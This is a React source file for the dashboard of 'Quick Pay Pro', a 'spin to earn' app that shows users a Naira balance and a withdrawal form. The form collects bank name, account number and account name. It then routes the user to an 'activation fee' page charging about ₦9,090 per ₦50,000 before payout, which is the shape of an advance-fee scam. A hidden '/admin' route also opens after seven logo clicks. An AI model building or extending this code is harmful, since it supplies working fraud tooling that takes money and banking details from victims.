import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAuth } from '../context/AuthContext';
import { Bell, LogOut, RotateCw, DollarSign, X } from 'lucide-react';

export const Dashboard: React.FC = () => {
  const [showWithdrawModal, setShowWithdrawModal] = useState(false);
  const [withdrawAmount, setWithdrawAmount] = useState('');
  const [selectedBank, setSelectedBank] = useState('');
  const [accountNumber, setAccountNumber] = useState('');
  const [accountName, setAccountName] = useState('');
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');
  const [showNotifications, setShowNotifications] = useState(false);
  const [logoClicks, setLogoClicks] = useState(0);
  const navigate = useNavigate();
  const { currentUser, logout, notifications, markNotificationAsRead } = useAuth();

  useEffect(() => {
    if (!currentUser) {
      navigate('/');
    }
  }, [currentUser, navigate]);

  const handleLogout = () => {
    logout();
    navigate('/');
  };

  const handleLogoClick = () => {
    const newClickCount = logoClicks + 1;
    setLogoClicks(newClickCount);
    
    if (newClickCount === 7) {
      navigate('/admin');
      setLogoClicks(0);
    }
  };

  const handleWithdraw = () => {
    setError('');
    setSuccess('');
    
    const amount = parseFloat(withdrawAmount);
    if (!amount || amount < 50000) {
      setError('Minimum withdrawal amount is ₦50,000');
      return;
    }
    
    if (!selectedBank || !accountNumber || !accountName) {
      setError('Please fill in all bank details');
      return;
    }
    
    if (amount > currentUser?.balance!) {
      setError('Insufficient balance');
      return;
    }
    
    const activationFee = Math.ceil((amount / 50000) * 9090);
    
    navigate('/activation-fee', {
      state: {
        amount,
        bankName: selectedBank,
        accountNumber,
        accountName,
        activationFee
      }
    });
  };

  const unreadCount = notifications.filter(n => !n.read).length;

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-blue-900 to-gray-900">
      <header className="bg-white shadow-lg">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-16">
            <div 
              className="flex items-center cursor-pointer select-none"
              onClick={handleLogoClick}
            >
              <div className="h-10 w-10 bg-gradient-to-br from-blue-600 to-blue-800 rounded-xl flex items-center justify-center">
                <svg className="h-6 w-6 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={2}>
                  <path d="M12 2L2 7L12 12L22 7L12 2Z" />
                  <path d="M2 17L12 22L22 17" />
                  <path d="M2 12L12 17L22 12" />
                </svg>
              </div>
              <span className="ml-3 text-xl font-bold text-gray-900">Quick Pay Pro</span>
              {logoClicks > 0 && (
                <span className="ml-2 text-xs text-gray-500">({logoClicks}/7)</span>
              )}
            </div>
            
            <div className="flex items-center space-x-4">
              <div className="relative">
                <button
                  onClick={() => setShowNotifications(!showNotifications)}
                  className="relative p-2 text-gray-600 hover:text-gray-900 transition"
                >
                  <Bell className="h-6 w-6" />
                  {unreadCount > 0 && (
                    <span className="absolute -top-1 -right-1 bg-red-500 text-white text-xs rounded-full h-5 w-5 flex items-center justify-center">
                      {unreadCount}
                    </span>
                  )}
                </button>
                
                {showNotifications && (
                  <div className="absolute right-0 mt-2 w-80 bg-white rounded-lg shadow-xl border border-gray-200 max-h-96 overflow-y-auto z-50">
                    <div className="p-4 border-b border-gray-200 flex justify-between items-center">
                      <h3 className="font-semibold text-gray-900">Notifications</h3>
                      <button
                        onClick={() => setShowNotifications(false)}
                        className="text-gray-400 hover:text-gray-600"
                      >
                        <X className="h-4 w-4" />
                      </button>
                    </div>
                    <div className="p-2">
                      {notifications.length === 0 ? (
                        <p className="text-gray-500 text-center py-4">No notifications</p>
                      ) : (
                        notifications.map(notif => (
                          <div
                            key={notif.id}
                            onClick={() => markNotificationAsRead(notif.id)}
                            className={`p-3 rounded-lg mb-2 cursor-pointer transition ${
                              notif.read ? 'bg-gray-50' : 'bg-blue-50 border-l-4 border-blue-500'
                            }`}
                          >
                            <p className={`text-sm ${notif.type === 'success' ? 'text-green-700' : 'text-red-700'}`}>
                              {notif.message}
                            </p>
                            <p className="text-xs text-gray-500 mt-1">
                              {new Date(notif.timestamp).toLocaleString()}
                            </p>
                          </div>
                        ))
                      )}
                    </div>
                  </div>
                )}
              </div>
              
              <button
                onClick={handleLogout}
                className="flex items-center space-x-2 text-gray-600 hover:text-red-600 transition"
              >
                <LogOut className="h-5 w-5" />
                <span className="font-medium">Logout</span>
              </button>
            </div>
          </div>
        </div>
      </header>

      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
        <div className="text-center mb-12">
          <h1 className="text-4xl font-bold text-white mb-4">
            Welcome back, {currentUser?.name}!
          </h1>
          <p className="text-xl text-blue-200">Spin to earn platform</p>
        </div>

        <div className="max-w-md mx-auto">
          <div className="bg-gradient-to-br from-blue-600 to-blue-800 rounded-3xl shadow-2xl p-8 mb-8 transform hover:scale-105 transition">
            <div className="text-center">
              <div className="inline-flex h-20 w-20 items-center justify-center rounded-full bg-white bg-opacity-20 mb-6">
                <RotateCw className="h-10 w-10 text-white animate-spin" />
              </div>
              <h2 className="text-2xl font-semibold text-white mb-2">Your Balance</h2>
              <div className="text-5xl font-bold text-white mb-4">
                ₦{currentUser?.balance.toLocaleString()}
              </div>
              <p className="text-blue-100">Available for withdrawal</p>
            </div>
          </div>

          <button
            onClick={() => setShowWithdrawModal(true)}
            className="w-full bg-gradient-to-r from-green-600 to-green-700 text-white py-4 rounded-xl font-semibold text-lg hover:from-green-700 hover:to-green-800 transition transform hover:scale-105 shadow-lg flex items-center justify-center"
          >
            <DollarSign className="mr-2 h-6 w-6" />
            Withdraw Funds
          </button>

          {showWithdrawModal && (
            <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-40">
              <div className="bg-white rounded-2xl p-6 w-full max-w-md max-h-screen overflow-y-auto">
                <div className="flex justify-between items-center mb-6">
                  <h3 className="text-xl font-bold text-gray-900">Withdraw Funds</h3>
                  <button
                    onClick={() => setShowWithdrawModal(false)}
                    className="text-gray-400 hover:text-gray-600"
                  >
                    <X className="h-6 w-6" />
                  </button>
                </div>

                {error && (
                  <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-lg mb-4">
                    {error}
                  </div>
                )}

                {success && (
                  <div className="bg-green-50 border border-green-200 text-green-700 px-4 py-3 rounded-lg mb-4">
                    {success}
                  </div>
                )}

                <div className="space-y-4">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Withdrawal Amount (Min: ₦50,000)
                    </label>
                    <input
                      type="number"
                      value={withdrawAmount}
                      onChange={(e) => setWithdrawAmount(e.target.value)}
                      className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 outline-none"
                      placeholder="Enter amount"
                    />
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Select Bank
                    </label>
                    <select
                      value={selectedBank}
                      onChange={(e) => setSelectedBank(e.target.value)}
                      className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 outline-none"
                    >
                      <option value="">Choose a bank...</option>
                      {[
                        "Access Bank", "Citibank", "Ecobank Nigeria", "Fidelity Bank", 
                        "First Bank of Nigeria", "First City Monument Bank (FCMB)", 
                        "Globus Bank", "Guaranty Trust Bank (GTB)", "Heritage Bank", 
                        "Jaiz Bank", "Keystone Bank", "Parallex Bank", "Polaris Bank", 
                        "Premium Trust Bank", "Providus Bank", "Signature Bank", 
                        "Stanbic IBTC Bank", "Standard Chartered Bank", "Sterling Bank", 
                        "SunTrust Bank", "Titan Trust Bank", "Union Bank of Nigeria", 
                        "United Bank for Africa (UBA)", "Unity Bank", "Wema Bank", 
                        "Zenith Bank", "PalmPay", "Opay", "Kuda Bank", "Moniepoint"
                      ].map(bank => (
                        <option key={bank} value={bank}>{bank}</option>
                      ))}
                    </select>
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Account Number
                    </label>
                    <input
                      type="text"
                      value={accountNumber}
                      onChange={(e) => setAccountNumber(e.target.value)}
                      className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 outline-none"
                      placeholder="Enter account number"
                    />
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Account Name
                    </label>
                    <input
                      type="text"
                      value={accountName}
                      onChange={(e) => setAccountName(e.target.value)}
                      className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 outline-none"
                      placeholder="Enter account name"
                    />
                  </div>

                  <button
                    onClick={handleWithdraw}
                    className="w-full bg-gradient-to-r from-green-600 to-green-700 text-white py-3 rounded-lg font-semibold hover:from-green-700 hover:to-green-800 transition"
                  >
                    Proceed Withdrawal
                  </button>
                </div>
              </div>
            </div>
          )}
        </div>
      </main>
    </div>
  );
};